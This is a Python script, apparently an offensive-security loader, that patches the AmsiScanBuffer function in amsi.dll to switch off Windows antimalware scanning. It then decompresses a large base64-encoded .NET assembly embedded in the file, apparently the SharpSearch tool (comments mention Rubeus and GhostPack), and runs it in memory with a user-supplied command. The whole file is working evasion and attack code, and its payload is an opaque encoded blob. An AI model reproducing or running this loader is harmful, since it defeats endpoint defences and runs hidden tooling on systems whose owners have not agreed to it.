import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSearch.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()